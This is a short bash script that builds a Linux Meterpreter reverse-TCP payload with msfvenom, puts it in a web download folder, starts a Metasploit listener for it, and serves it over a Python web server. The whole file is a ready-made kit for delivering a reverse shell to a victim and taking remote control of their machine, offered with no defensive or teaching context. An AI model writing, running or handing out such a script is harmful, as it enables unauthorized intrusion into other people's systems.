#!/bin/bash

# Set the local IP address
LOCAL_IP=$(hostname -I | awk '{print $1}')

# Set the payload name
PAYLOAD_NAME="payload_$(date +%s).elf"

# Set the Metasploit options
LHOST=$LOCAL_IP
LPORT=11506

# Define the start_server function
start_server() {
  echo "Web server started at http://$LOCAL_IP/"
  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"

  # Start a simple Python web server
  python -m SimpleHTTPServer 80
}

# Generate the payload using msfvenom
echo "Generating payload..."
sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "/var/www/html/downloads/$PAYLOAD_NAME"

# Set the file permissions for the payload
echo "Setting file permissions..."
sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"

# Start the Metasploit listener
echo "Starting Metasploit listener..."
gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"

# Start the web server and print the access log to the terminal
start_server

# Stop the web server and Metasploit listener when the script is terminated
trap 'echo "Stopping web server and Metasploit listener..."; sudo pkill -f "msfconsole"; exit' SIGINT
